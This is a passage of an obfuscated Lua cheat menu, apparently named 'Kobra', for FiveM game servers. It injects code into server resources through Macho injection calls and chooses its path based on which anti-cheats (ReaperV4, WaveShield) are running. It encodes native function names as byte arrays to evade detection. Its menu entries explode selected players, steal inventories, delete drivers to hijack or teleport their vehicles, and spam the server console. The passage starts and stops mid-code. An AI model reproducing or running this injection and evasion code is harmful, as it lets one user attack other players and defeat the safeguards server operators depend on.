                                    elseif selected == "Killer Whale" then
                                        pedModel = "a_c_killerwhale"
                                    elseif selected == "Mountain Lion" then
                                        pedModel = "a_c_mtlion"
                                    elseif selected == "Pig" then
                                        pedModel = "a_c_pig"
                                    elseif selected == "Pigeon" then
                                        pedModel = "a_c_pigeon"
                                    elseif selected == "Poodle" then
                                        pedModel = "a_c_poodle"
                                    elseif selected == "Pug" then
                                        pedModel = "a_c_pug"
                                    elseif selected == "Rabbit" then
                                        pedModel = "a_c_rabbit_01"
                                    elseif selected == "Rat" then
                                        pedModel = "a_c_rat"
                                    elseif selected == "Retriever" then
                                        pedModel = "a_c_retriever"
                                    elseif selected == "Rhesus Monkey" then
                                        pedModel = "a_c_rhesus"
                                    elseif selected == "Rottweiler" then
                                        pedModel = "a_c_rottweiler"
                                    elseif selected == "Seagull" then
                                        pedModel = "a_c_seagull"
                                    elseif selected == "Shepherd" then
                                        pedModel = "a_c_shepherd"
                                    elseif selected == "Stingray" then
                                        pedModel = "a_c_stingray"
                                    elseif selected == "Tiger Shark" then
                                        pedModel = "a_c_sharktiger"
                                    elseif selected == "Hammerhead Shark" then
                                        pedModel = "a_c_sharkhammer"
                                    elseif selected == "Chickenhawk" then
                                        pedModel = "a_c_chickenhawk"
                                    elseif selected == "Cormorant" then
                                        pedModel = "a_c_cormorant"
                                    else
                                        pedModel = nil
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)

                                        print("Changed ped to: " .. pedModel)
                                    else
                                        print("Invalid animal selected: " .. tostring(selected))
                                    end
                                ]]):format(v384));end}}}}},{icon="",label="Server",type="subMenu",categories={{label="List",tabs={{type="button",label="Select Everyone"},{type="button",label="Un-Select Everyone"},{type="button",label="Clear Selection"},{type="divider",label="Nearby Players"}}},{label="Safe",tabs={{type="button",label="Teleport to Player",desc="This will teleport you to the selected player",onSelect=function() local v385=0 + 0 ;local v386;while true do if (v385==1) then if v386 then local v854=0 -0 ;local v855;local v856;local v857;local v858;while true do if (v854==1) then v856=GetPlayerPed(v855);v857=GetEntityCoords(v856);v854=2;end if (v854==(593 -(396 + 195))) then v858=GetEntityHeading(v856);SetEntityCoords(PlayerPedId(),v857.x,v857.y,v857.z,false,false,false,false);v854=3;end if (v854==(8 -5)) then SetEntityHeading(PlayerPedId(),v858);v277:Notify("success","Kobra",("You have teleported to %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v386)),v386),4761 -(440 + 1321) );break;end if ((1829 -(1059 + 770))==v854) then v855=GetPlayerFromServerId(v386);if ((v855== -(4 -3)) or  not DoesEntityExist(GetPlayerPed(v855))) then v277:Notify("error","Kobra","There was an error while trying to teleport to that player! (ERR:1)",3545 -(424 + 121) );v27[v386]=nil;v12:UpdateListMenu();return;end v854=1;end end else v277:Notify("error","Kobra","You must select a player to do this!",547 + 2453 );end break;end if (v385==(1347 -(641 + 706))) then v386=nil;for v793,v794 in pairs(v27) do if v794 then v386=v793;break;end end v385=1 + 0 ;end end end},{type="checkbox",label="Spectate Player",checked=false,desc="This will attempt to Spectate the player",onSelect=function(v387) local v388=440 -(249 + 191) ;local v389;while true do if (v388==0) then v389=nil;for v795,v796 in pairs(v27) do if v796 then v389=v795;break;end end v388=4 -3 ;end if (v388==1) then v277:HandleSpectateToggle(v389,v387);break;end end end},{type="button",label="Copy Appearance",desc="Copy Players Clothing",onSelect=function() local v390={};for v535,v536 in pairs(v27) do if v536 then v390[ #v390 + (3 -2) ]=v535;end end if ( #v390==(427 -(183 + 244))) then local v597=0 + 0 ;while true do if (v597==0) then v277:Notify("error","Kobra","You must select a player to do this!",3730 -(434 + 296) );return;end end end local v391=v390[2 -1 ];local v392=GetResourceState("ReaperV4")=="started" ;if v392 then MachoInjectThread(512 -(169 + 343) ,"any","",string.format([[
                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end
                                        local function findClientIdByServerId(sid)
                                            local players = _g(_b("GetActivePlayers"))()
                                            for _, pid in ipairs(players) do
                                                if _g(_b("GetPlayerServerId"))(pid) == sid then
                                                    return pid
                                                end
                                            end
                                            return -1
                                        end
                                        
                                        local function CopyClothing(targetSid)
                                            local clientId = findClientIdByServerId(targetSid)
                                            if clientId == -1 then
                                                print("CLIENT ID NOT FOUND!")
                                                return
                                            end
                                            
                                            local targetPed = _g(_b("GetPlayerPed"))(clientId)
                                            local myPed = _g(_b("PlayerPedId"))()
                                            
                                            if _g(_b("DoesEntityExist"))(targetPed) and _g(_b("DoesEntityExist"))(myPed) then
                                                print("COPYING CLOTHING...")
                                                
                                                -- COPY EVERYTHING - NO CLONING!
                                                _g(_b("SetPedComponentVariation"))(myPed, 1, _g(_b("GetPedDrawableVariation"))(targetPed, 1), _g(_b("GetPedTextureVariation"))(targetPed, 1), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 3, _g(_b("GetPedDrawableVariation"))(targetPed, 3), _g(_b("GetPedTextureVariation"))(targetPed, 3), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 4, _g(_b("GetPedDrawableVariation"))(targetPed, 4), _g(_b("GetPedTextureVariation"))(targetPed, 4), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 6, _g(_b("GetPedDrawableVariation"))(targetPed, 6), _g(_b("GetPedTextureVariation"))(targetPed, 6), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 8, _g(_b("GetPedDrawableVariation"))(targetPed, 8), _g(_b("GetPedTextureVariation"))(targetPed, 8), 0)
                                                _g(_b("SetPedComponentVariation"))(myPed, 11, _g(_b("GetPedDrawableVariation"))(targetPed, 11), _g(_b("GetPedTextureVariation"))(targetPed, 11), 0)
                                                
                                                -- Copy accessories
                                                _g(_b("SetPedPropIndex"))(myPed, 0, _g(_b("GetPedPropIndex"))(targetPed, 0), _g(_b("GetPedPropTextureIndex"))(targetPed, 0), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 1, _g(_b("GetPedPropIndex"))(targetPed, 1), _g(_b("GetPedPropTextureIndex"))(targetPed, 1), true)
                                                _g(_b("SetPedPropIndex"))(myPed, 2, _g(_b("GetPedPropIndex"))(targetPed, 2), _g(_b("GetPedPropTextureIndex"))(targetPed, 2), true)
                                                
                                                print("CLOTHING COPIED!")
                                            else
                                                print("PED NOT FOUND!")
                                            end
                                        end
                                        
                                        CopyClothing(%d)
                                    ]],v391));else local function v598(v722) local v723=0;local v724;while true do if (v723==(1 + 0)) then return v724;end if (v723==(0 -0)) then v724={};for v992=2 -1 , #v722 do v724[v992]=string.byte(v722,v992);end v723=1 + 0 ;end end end local function v599(v725) local v726=0 -0 ;local v727;while true do if (v726==0) then v727="";for v994=1, #v725 do v727=v727   .. string.char(v725[v994]) ;end v726=1124 -(651 + 472) ;end if (v726==1) then return v727;end end end local function v600(v728) local v729=v599(v728);local v730=_G[v729];return v730;end local function v601(v731) local v732=0 + 0 ;local v733;while true do if ((1 + 0)==v732) then return  -1;end if (v732==(0 -0)) then v733=v600(v598("GetActivePlayers"))();for v995,v996 in ipairs(v733) do if (v600(v598("GetPlayerServerId"))(v996)==v731) then return v996;end end v732=484 -(397 + 86) ;end end end local function v602(v734) local v735=v601(v734);if (v735== -(877 -(423 + 453))) then local v859=0;while true do if (v859==0) then print("^1[ERROR] Client ID not found for Server ID: "   .. v734   .. "^0" );return;end end end local v736=v600(v598("GetPlayerPed"))(v735);local v737=v600(v598("PlayerPedId"))();if (v600(v598("DoesEntityExist"))(v736) and v600(v598("DoesEntityExist"))(v737)) then print("^2[Kobra] Copying clothing from Server ID: "   .. v734   .. "^0" );v600(v598("SetPedComponentVariation"))(v737,1 + 0 ,v600(v598("GetPedDrawableVariation"))(v736,1 + 0 ),v600(v598("GetPedTextureVariation"))(v736,1),0 + 0 );v600(v598("SetPedComponentVariation"))(v737,3 + 0 ,v600(v598("GetPedDrawableVariation"))(v736,3 + 0 ),v600(v598("GetPedTextureVariation"))(v736,1193 -(50 + 1140) ),0 + 0 );v600(v598("SetPedComponentVariation"))(v737,4,v600(v598("GetPedDrawableVariation"))(v736,3 + 1 ),v600(v598("GetPedTextureVariation"))(v736,4),0 + 0 );v600(v598("SetPedComponentVariation"))(v737,8 -2 ,v600(v598("GetPedDrawableVariation"))(v736,5 + 1 ),v600(v598("GetPedTextureVariation"))(v736,6),596 -(157 + 439) );v600(v598("SetPedComponentVariation"))(v737,13 -5 ,v600(v598("GetPedDrawableVariation"))(v736,26 -18 ),v600(v598("GetPedTextureVariation"))(v736,23 -15 ),918 -(782 + 136) );v600(v598("SetPedComponentVariation"))(v737,11,v600(v598("GetPedDrawableVariation"))(v736,11),v600(v598("GetPedTextureVariation"))(v736,866 -(112 + 743) ),0);v600(v598("SetPedPropIndex"))(v737,0,v600(v598("GetPedPropIndex"))(v736,0),v600(v598("GetPedPropTextureIndex"))(v736,1171 -(1026 + 145) ),true);v600(v598("SetPedPropIndex"))(v737,1,v600(v598("GetPedPropIndex"))(v736,1),v600(v598("GetPedPropTextureIndex"))(v736,1 + 0 ),true);v600(v598("SetPedPropIndex"))(v737,720 -(493 + 225) ,v600(v598("GetPedPropIndex"))(v736,2),v600(v598("GetPedPropTextureIndex"))(v736,7 -5 ),true);print("^2[Kobra] Clothing copied successfully!^0");else print("^3[WARNING] Target or local ped does not exist.^0");end end v602(v391);end v277:Notify("success","Kobra","Copied clothing!",5000);end},{type="button",label="Launch Player",desc="This will attempt to launch the player into the sky",onSelect=function() local v393={};for v537,v538 in pairs(v27) do if v538 then v393[ #v393 + 1 ]=v537;end end if ( #v393==(0 -0)) then local v603=0 + 0 ;while true do if (v603==(0 -0)) then v277:Notify("error","Kobra","You must select a player to do this!",3000);return;end end end v277:HandleLaunchPlayer(v393);v277:Notify("success","Kobra","Attempting to TEST",1456 + 3544 );end}}},{label="Risky",tabs={{type="button",label="Explode Player",desc="This will attempt to explode the player using a vehicle",onSelect=function() local v394={};for v539,v540 in pairs(v27) do if v540 then v394[ #v394 + 1 ]=v539;end end if ( #v394==(0 -0)) then local v604=0;while true do if (v604==(1595 -(210 + 1385))) then v277:Notify("error","Kobra","You must select a player to do this!",4689 -(1201 + 488) );return;end end end for v541,v542 in ipairs(v394) do local v543=0 + 0 ;local v544;local v545;while true do if (v543==(0 -0)) then v544=v542;v545=GetPlayerFromServerId(v542);v543=1 -0 ;end if ((586 -(352 + 233))==v543) then if ((v545== -1) or  not DoesEntityExist(GetPlayerPed(v545))) then v277:Notify("error","Kobra","You must select a player to do this!",3000);v27[v542]=nil;return;else local v942=[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                local func = _G[decode(n)]
                                                if not func then
                                                    return nil
                                                end
                                                return func
                                            end
                                            local function wait(n)
                                                local waitFunc = g({87,97,105,116}) -- "Wait"
                                                if not waitFunc then
                                                    return
                                                end
                                                return waitFunc(n)
                                            end

                                            local vehicleName = decode({109,97,110,99,104,101,122}) -- "manchez"
                                            local requestModel = g({82,101,113,117,101,115,116,77,111,100,101,108})
                                            if not requestModel then return end
                                            requestModel(vehicleName)

                                            local hasModelLoaded = g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})
                                            if hasModelLoaded then
                                                local attempts = 0
                                                while not hasModelLoaded(vehicleName) and attempts < 20 do
                                                    wait(500)
                                                    attempts = attempts + 1
                                                end
                                                if attempts >= 20 then
                                                    return
                                                end
                                            end

                                            local getPlayerFromServerId = g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})
                                            if not getPlayerFromServerId then return end
                                            local targetPlayer = getPlayerFromServerId(]]   .. tostring(v544)   .. [[)
                                            if targetPlayer == -1 then
                                                return
                                            end

                                            local getPlayerPed = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                            if not getPlayerPed then return end
                                            local targetPed = getPlayerPed(targetPlayer)
                                            if not targetPed or targetPed == 0 then
                                                return
                                            end

                                            local localPlayerPed = getPlayerPed(-1) -- Get local player ped
                                            if not localPlayerPed or localPlayerPed == 0 then
                                                return
                                            end

                                            local getEntityCoords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})
                                            local getEntityHeading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})
                                            local setEntityHealth = g({83,101,116,69,110,116,105,116,121,72,101,97,108,116,104})
                                            if not getEntityCoords or not getEntityHeading then return end
                                            local targetPos = getEntityCoords(targetPed)
                                            local heading = getEntityHeading(targetPed)

                                            local giveWeapon = g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})
                                            local setCurrentWeapon = g({83,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110})
                                            local getHashKey = g({71,101,116,72,97,115,104,75,101,121})
                                            local shootBullet = g({83,104,111,111,116,83,105,110,103,108,101,66,117,108,108,101,116,66,101,116,119,101,101,110,67,111,111,114,100,115})
                                            local removeWeapon = g({82,101,109,111,118,101,87,101,97,112,111,110,70,114,111,109,80,101,100})
                                            local setMissionEntity = g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})

                                            local pistolHash = getHashKey(decode({87,69,65,80,79,78,95,65,80,80,73,83,84,79,76}))
                                            giveWeapon(localPlayerPed, pistolHash, 200, false, true)
                                            setCurrentWeapon(localPlayerPed, pistolHash, true)

                                            wait(1000) -- Wait 3 seconds before spawning vehicle

                                            local createVehicle = g({67,114,101,97,116,101,86,101,104,105,99,108,101})
                                            if not createVehicle then return end
                                            local vehicleSpawnPos = {x = targetPos.x + 2.0, y = targetPos.y, z = targetPos.z + 0.2} -- Offset 5 units, slight Z lift
                                            local vehicle = createVehicle(vehicleName, vehicleSpawnPos.x, vehicleSpawnPos.y, vehicleSpawnPos.z, heading, true, true)
                                            if not vehicle or vehicle == 0 then
                                                return
                                            end

                                            if setMissionEntity then
                                                setMissionEntity(vehicle, true, true)
                                            end
                                            if setEntityHealth then
                                                setEntityHealth(vehicle, 10) -- Set low health for easy explosion
                                            end

                                            for i = 1, 60 do
                                                local vehicleCoords = getEntityCoords(vehicle) -- Get updated vehicle coords each time
                                                shootBullet(
                                                    targetPos.x, targetPos.y, targetPos.z + 1.0, -- Start near target ped
                                                    vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 0.3, -- Aim at vehicle center (tighter offset)
                                                    2000.0, true, pistolHash, localPlayerPed, true, false, 2000.0 -- Higher speed for accuracy
                                                )
                                                wait(1) -- Slightly slower shooting for stability
                                            end

                                            removeWeapon(localPlayerPed, pistolHash)
                                        ]] ;MachoInjectResourceRaw("any",v942,v544);v277:Notify("success","Kobra","Attempting to Explode Player",5000);end break;end end end v12:UpdateListMenu();end},{type="button",label="Steal Inventory",desc="This will attempt to open the selected players inventory",onSelect=function() local v395=0 + 0 ;local v396;while true do if (v395==(0 -0)) then v396={};for v797,v798 in pairs(v27) do if v798 then v396[ #v396 + (575 -(489 + 85)) ]=v797;end end v395=1502 -(277 + 1224) ;end if (v395==(1495 -(663 + 830))) then v277:Notify("success","Kobra","Attempting to steal inventory",4392 + 608 );break;end if (v395==(2 -1)) then if ( #v396==0) then v277:Notify("error","Kobra","You must select a player to do this!",3875 -(461 + 414) );return;end v277:HandleTakeInventory(v396);v395=2;end end end},{type="divider",label="Ped Options"},{type="button",label="Clone Player",onSelect=function() local v397=0 + 0 ;local v398;while true do if (v397==(1 + 1)) then v277:Notify("success","Kobra","Cloned Player",5000);break;end if (1==v397) then if ( #v398==0) then v277:Notify("error","Kobra","You must select a player to do this!",3000);return;end v277:HandleClonePlayer(v398);v397=2;end if (v397==(0 + 0)) then v398={};for v799,v800 in pairs(v27) do if v800 then v398[ #v398 + 1 ]=v799;end end v397=251 -(172 + 78) ;end end end},{type="button",label="Attack Clone Player",onSelect=function() local v399={};for v546,v547 in pairs(v27) do if v547 then v399[ #v399 + 1 + 0 ]=v546;end end if ( #v399==0) then v277:Notify("error","Kobra","You must select a player to do this!",3000);return;end v277:HandleAttackClonePlayer(v399);v277:Notify("success","Kobra","Cloned Player",5000);end},{type="divider",label="Vehicle Options"},{type="scrollable",label="Attach Vehicle",scrollType="onEnter",value=1,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","kuruma","zentorno","entityxf","carbonizzare","elegy","massacro","vagner","nightshark","banshee","feltzer2","ruston","bullet","elegy2"},onSelect=function(v400) local v401={};for v548,v549 in pairs(v27) do if v549 then v401[ #v401 + (1290 -(426 + 863)) ]=v548;end end if ( #v401==(0 -0)) then local v605=0;while true do if (v605==(1654 -(873 + 781))) then v277:Notify("error","Kobra","You must select a player to do this!",3000);return;end end end v12:AttachSelectedVehicle(v401,v400);v277:Notify("success","Kobra","Vehicle Attached to "   ..  #v401   .. " Player(s)" ,6695 -1695 );end},{type="divider",label="Object Options"},{type="scrollable",label="Vehicle Object",scrollType="onEnter",value=3 -2 ,values={"bmx","sanchez","adder","blista","sultan","faggio","bati","pcj","oppressor","maverick","buzzard","cargobob","t20","comet","zentorno","tampa","nightshark","kuruma","buffalo","massacro","ferrari","comet2","issi2","vindicator","baller","baller2"},onSelect=function(v402) local v403=0 -0 ;local v404;while true do if (v403==(2 + 0)) then v12:SpawnSelectedObject(v404);break;end if (v403==(1093 -(770 + 322))) then if ( #v404==(0 + 0)) then local v860=0 + 0 ;while true do if (v860==(0 + 0)) then v277:Notify("error","Kobra","You must select at least one player!",3000);return;end end end v12.GetSelectedObjectModel=function(v801) return v402;end;v403=2 -0 ;end if (v403==0) then v404={};for v802,v803 in pairs(v27) do if v803 then v404[ #v404 + 1 ]=v802;end end v403=1 -0 ;end end end},{type="scrollable",label="Attach Prop",scrollType="onEnter",value=1,values={"prop_barrel_02a","prop_cone_float_1","prop_chair_01a","prop_boombox_01","prop_tool_broom","prop_golf_ball","prop_laptop_01a","prop_trafficcone_01a","prop_pizza_box_01","prop_mb_cargo_01a","prop_ld_crate_01a","prop_ld_fueldoor","prop_ld_greenscreen_01","prop_ld_shovel","prop_snow_bottle","prop_snow_locker_01","prop_dummy_01","prop_dummy_02"},onSelect=function(v405) local v406={};for v550,v551 in pairs(v27) do if v551 then v406[ #v406 + 1 ]=v550;end end if ( #v406==(0 -0)) then v277:Notify("error","Kobra","You must select at least one player!",3831 -(762 + 69) );return;end v12.GetSelectedObjectModel=function(v552) return v405;end;v12:SpawnSelectedObject(v406);v277:Notify("success","Kobra","Spawned object '"   .. tostring(v405)   .. "' for "   ..  #v406   .. " player(s)." ,16190 -11190 );end},{type="scrollable",label="Attach Furniture",scrollType="onEnter",value=1 + 0 ,values={"prop_table_01","prop_table_02","prop_table_03","prop_chair_02","prop_chair_03","prop_chair_04a","prop_sofa_01","prop_sofa_02","prop_sofa_03","prop_bed_01","prop_bed_02","prop_lamp_01","prop_lamp_02","prop_lamp_03","prop_couch_01","prop_couch_02","prop_tv_01","prop_tv_02","prop_tv_03","prop_computer_01","prop_computer_02","prop_monitor_01","prop_monitor_02"},onSelect=function(v408) local v409=1807 -(518 + 1289) ;local v410;while true do if (v409==(1 -0)) then if ( #v410==0) then local v861=0 + 0 ;while true do if (v861==(0 -0)) then v277:Notify("error","Kobra","You must select at least one player!",3000);return;end end end v12.GetSelectedObjectModel=function(v804) return v408;end;v409=2;end if (v409==(0 + 0)) then v410={};for v805,v806 in pairs(v27) do if v806 then v410[ #v410 + 1 ]=v805;end end v409=470 -(304 + 165) ;end if (v409==(2 + 0)) then v12:SpawnSelectedObject(v410);break;end end end},{type="scrollable",label="Attach Misc",scrollType="onEnter",value=1,values={"prop_beer_bottle","prop_soda_cup","prop_papercup_01","prop_cup_coffee_01","prop_champ_flute","prop_cs_burger_01","prop_cs_burger_02","prop_cs_hotdog_01","prop_cs_pizza_01","prop_cs_sandwich_01","prop_cs_juice_01"},onSelect=function(v411) local v412={};for v553,v554 in pairs(v27) do if v554 then v412[ #v412 + (1034 -(912 + 121)) ]=v553;end end if ( #v412==(0 + 0)) then v277:Notify("error","Kobra","You must select at least one player!",4289 -(1140 + 149) );return;end v12.GetSelectedObjectModel=function(v555) return v411;end;v12:SpawnSelectedObject(v412);v277:Notify("success","Kobra","Spawned object '"   .. tostring(v411)   .. "' for "   ..  #v412   .. " player(s)." ,3200 + 1800 );end}}},{label="Vehicle",tabs={{type="button",label="Kick From Vehicle",onSelect=function() local v414=nil;for v556,v557 in pairs(v27) do if v557 then v414=v556;break;end end if v414 then local v606=GetPlayerFromServerId(v414);if (v606== -(1 -0)) then v277:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:1)",558 + 2442 );v27[v414]=nil;v12:UpdateListMenu();return;end if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v606))) then v277:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:2)",3000);return;end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v862=1,2 do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function KickFromVehicleNewestV8(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        TaskLeaveVehicle(player, vehicle, 16)
                                                        Wait(450)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v606))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    KickFromVehicleNewestV8(entityHit)
                                                end
                                            end)
                                        ]] );end else return;end v27[v414]=true;v277:UpdateListMenu();else v277:Notify("error","Kobra","You must select a player to do this!",10267 -7267 );end end},{type="button",label="Teleport to Ocean",onSelect=function() local v415=nil;for v558,v559 in pairs(v27) do if v559 then v415=v558;break;end end if v415 then local v608=GetPlayerFromServerId(v415);if (v608== -1) then v277:Notify("error","Kobra","There was an error while trying to tp the vehicle to the ocean! (ERR:1)",3000);v27[v415]=nil;v12:UpdateListMenu();return;end if  not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(v608))) then local v809=0;while true do if (v809==0) then v277:Notify("error","Kobra","There was an error while trying to kick the player from their vehicle! (ERR:2)",518 + 2482 );return;end end end if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then for v863=3 -2 ,2 do MachoInjectResourceRaw(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function TeleportVehicleToOcean(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        SetEntityCoords(vehicle, 0.0, 0.0, 0.0, false, false, false, false)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]]   .. GetVehiclePedIsUsing(GetPlayerPed(v608))   .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    TeleportVehicleToOcean(entityHit)
                                                end
                                            end)
                                        ]] );end else return;end v27[v415]=true;v277:UpdateListMenu();else v277:Notify("error","Kobra","You must select a player to do this!",3000);end end}}},{label="Triggers",tabs={{type="checkbox",label="Server Console Spam",checked=false,onSelect=function(v416) if v416 then print("Console Spam Started...");v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,[[
                                    if not _G.KobraServerConsoleSpamInitialized then
